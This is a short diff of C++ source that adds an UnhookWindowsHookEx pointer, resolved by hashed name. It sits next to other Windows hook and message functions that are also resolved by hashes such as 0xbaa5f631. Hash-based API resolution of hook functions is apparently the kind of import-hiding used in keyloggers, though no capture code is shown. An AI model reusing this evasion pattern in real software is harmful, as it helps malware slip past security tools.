@@ -8,6 +8,10 @@ using customSetWindowsHookExA = HHOOK(NTAPI*)(
     DWORD dwThreadId
     );
 
+using customUnHookWindowsHookExA = BOOL(NTAPI*)(
+    HHOOK hhk
+    );
+
 using customGetModuleHandleW = HMODULE(NTAPI*)(
     LPCWSTR lpModuleName
     );
@@ -37,6 +41,7 @@ using customGetWindowThreadProcessId = DWORD(NTAPI*)(
 
 
 customSetWindowsHookExA SetWindowsHookExA_c = (customSetWindowsHookExA)getFunctionAddressByHash((char*)"User32", 0xbaa5f631);
+customUnHookWindowsHookExA UnHookWindowsHookExA_c = (customUnHookWindowsHookExA)getFunctionAddressByHash((char*)"User32", 0xa6a8459c);
 customGetModuleHandleW GetModuleHandleW_c = (customGetModuleHandleW)getFunctionAddressByHash((char*)"Kernel32", 0xb9e0a54b);
 customGetMessageW GetMessageW_c = (customGetMessageW)getFunctionAddressByHash((char*)"User32", 0xd7c9ce3b);
 customCallNextHookEx CallNextHookEx_c = (customCallNextHookEx)getFunctionAddressByHash((char*)"User32", 0x9b6b959c);
